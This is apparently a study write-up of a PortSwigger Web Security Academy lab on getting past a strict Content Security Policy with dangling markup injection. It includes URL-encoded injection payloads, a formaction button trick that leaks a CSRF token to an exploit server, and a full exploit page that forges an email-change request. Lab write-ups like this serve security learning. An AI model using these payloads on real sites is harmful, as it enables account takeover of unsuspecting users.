# [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

> log in -> `wiener:peter`

- if you add `&email=duck` as a parameter it will reflect on the site:

```
https://xxx.web-security-academy.net/my-account?id=wiener&email=duck
```

> on ispection the input have a hidden csrf input shipped with:

```
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
  <label>Email</label>
  <input required="" type="email" name="email" value="duck" />
  <input required="" type="hidden" name="csrf" value="G2S3HEyrGsnfXT2CFKkr4yH8rqwOakRi" />
  <button class="button" type="submit">Update email</button>
</form>
```

> lets try to break out form the `value` of the `input` tag

`"><img src="nothing`

- needs to be url encoded ->

`%22%3E%3Cimg%20src=%22nothing%0A%0A`

```
https://xxx.web-security-academy.net/my-account?id=wiener&email=%22%3E%3Cimg%20src=%22nothing%0A%0A
```

- can break out for the value, but the CSP blocks the image, checking the response on the network tab:

```
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
```

> lets change it to anchor tag

`"><a href="https://www.google.com">Click me</a`

- url encoded ->

`%22%3E%3Ca%20href=%22https://www.google.com%22%3EClick%20me%3C/a`

- it works

## the dangling effect

try using the `base` tag with the `target` attribute

`https://xxx.web-security-academy.net/my-account?id=wiener&email="><a href="https://www.metallica.com">Click me</a><base target="duck"`

- does not work on google, that is why metallica

- url encoded ->

```
https://xxx.web-security-academy.net/my-account?id=wiener&email=%22%3E%3Ca%20href=%22https://www.metallica.com%22%3EClick%20me%3C/a%3E%3Cbase%20target=%22duck%22
```

- on clicking the link it will open the metallica.com and in the devtools type `window.name` -> "duck"

> if the last `"` is removed from the url then it will give the `target` the value until it finds one to close it (maybe need to use a `'` instead)

> this does not work anymore browsers got updated to fix that but there is another option

## alternative solution

```
https://xxx.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-zzz.exploit-server.net/exploit" formmethod="get">Click me</button>
```

- the `formaction` attribute will override the form submit url
- the `formmethod` attribute will override the form submit method type

> this is the exploit that needs to be delivered to the victim:

```
<body>
  <script>
    const academyFrontend = "https://xxx.web-security-academy.net/";
    const exploitServer = "https://yyy.exploit-server.net/exploit";

    const url = new URL(location);
    const csrf = url.searchParams.get("csrf");

    if (csrf) {
      const form = document.createElement("form");
      const email = document.createElement("input");
      const token = document.createElement("input");

      token.name = "csrf";
      token.value = csrf;

      email.name = "email";
      email.value = "hacker@evil-user.net";

      form.method = "post";
      form.action = `${academyFrontend}my-account/change-email`;
      form.append(email);
      form.append(token);

      document.documentElement.append(form);
      form.submit();
    } else {
      location = `${academyFrontend}my-account?email=blah@blah"><button class=button formaction=${exploitServer} formmethod=get type=submit>Click me</button>`;
    }
  </script>
</body>
```

- `academyFrontend` is the site that the victim will visit
- `exploitServer` is where the `csrf` will be sent

> at first there is no `csrf` token so the `else` condition redirect the browser to that `url` where the click button triggers the exposer of the `csrf` token with a GET request

> so on the click the victim sends the credentials to the exploit server and visits it the same time, the url has the `csrf` key so it forges a form with an emil change request and submits it

> this only works if the `csrf` token and the session key is present on the submit, the session key is that the victim has in its browser

- this exploit actually a two scripts merged together, the first part is the click me button exposure to the victim, and second part is the forge of form that actually does not needs to be sent to the victim it only needs to be in the exploit server, but this way it is a compact exploit
